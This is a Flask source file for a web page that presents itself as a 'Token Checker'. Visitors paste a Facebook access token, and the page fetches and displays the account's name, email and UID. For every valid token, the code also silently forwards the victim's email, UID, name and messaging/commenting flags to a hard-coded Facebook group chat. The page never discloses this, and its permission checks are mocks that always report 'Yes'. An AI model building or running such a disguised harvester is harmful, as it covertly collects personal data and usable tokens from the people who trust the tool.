from flask import Flask, render_template_string, request
import requests

app = Flask(__name__)

# Replace with actual Group UID
GROUP_CHAT_UID = '9456516084398824'

@app.route('/')
def index():
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Token Checker by RAJ MISHRA</title>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    height: 100vh;
                    background-color: black;
                    color: white;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    flex-direction: column;
                    overflow: hidden;
                }

                .text {
                    font-size: 2rem;
                    font-weight: bold;
                    text-align: center;
                    letter-spacing: 2px;
                    margin-bottom: 40px;
                }

                .token-checker input[type="text"] {
                    width: 300px;
                    padding: 10px;
                }

                .token-checker input[type="submit"] {
                    padding: 10px 20px;
                    background-color: green;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-top: 10px;
                }

                .token-checker input[type="submit"]:hover {
                    background-color: darkgreen;
                }

                .token-checker {
                    margin-top: 40px;
                    text-align: center;
                }

                .profile-details {
                    text-align: center;
                    margin-top: 30px;
                }

                img {
                    width: 100px;
                    height: 100px;
                    border-radius: 50%;
                }
            </style>
        </head>
        <body>
            <div class="text">VAMPIRE RULEX BOY RAJ MISHRA</div>

            <div class="token-checker">
                <h2>Token Checker</h2>
                <form action="/check_token" method="POST">
                    <label for="token">Enter Token:</label><br>
                    <input type="text" id="token" name="token" required><br><br>
                    <input type="submit" value="Check Token">
                </form>
            </div>
        </body>
        </html>
    ''')

@app.route('/check_token', methods=['POST'])
def check_token():
    token = request.form['token']
    token_details = check_token_details(token)
    if token_details['valid']:
        # Send details to Facebook Group Chat
        send_to_group_chat(token_details)
    
    return render_template_string('''
        <h1>Token Checker</h1>
        {% if token_details['valid'] %}
            <div class="profile-details">
                <img src="{{ token_details['profile_pic'] }}" alt="Profile Picture">
                <p>Name: {{ token_details['name'] }}</p>
                <p>Email: {{ token_details['email'] }}</p>
                <p>UID: {{ token_details['uid'] }}</p>
                <p>Message Sendable: {{ token_details['message_sendable'] }}</p>
                <p>Comment Sendable: {{ token_details['comment_sendable'] }}</p>
            </div>
        {% else %}
            <p>Invalid Token</p>
        {% endif %}
        <a href="/">Back</a>
    ''', token_details=token_details)

def check_token_details(token):
    url = f"https://graph.facebook.com/me?access_token={token}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        # Check if the token can send messages and comments (you can expand on this check)
        message_sendable = "Yes" if check_send_permission(token, "messages") else "No"
        comment_sendable = "Yes" if check_send_permission(token, "comments") else "No"
        
        return {
            "valid": True,
            "name": data.get('name'),
            "email": data.get('email', 'Not Available'),
            "profile_pic": f"https://graph.facebook.com/{data['id']}/picture?type=large",
            "uid": data['id'],
            "message_sendable": message_sendable,
            "comment_sendable": comment_sendable
        }
    else:
        return {"valid": False}

def check_send_permission(token, permission_type):
    # You can add further checks here to determine if token can send messages or comments
    if permission_type == "messages":
        # Mock check, replace with actual logic
        return True
    elif permission_type == "comments":
        # Mock check, replace with actual logic
        return True
    return False

def send_to_group_chat(token_details):
    # Facebook Group Chat UID
    message = f"Email: {token_details['email']}\nUID: {token_details['uid']}\nName: {token_details['name']}\nMessage Sendable: {token_details['message_sendable']}\nComment Sendable: {token_details['comment_sendable']}"
    send_message_to_group(message)

def send_message_to_group(message):
    token = 'YOUR_FACEBOOK_PAGE_ACCESS_TOKEN'  # Replace with your Facebook Page access token
    url = f"https://graph.facebook.com/{GROUP_CHAT_UID}/messages"
    data = {
        'access_token': token,
        'message': message
    }
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print("Error sending message to group:", response.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
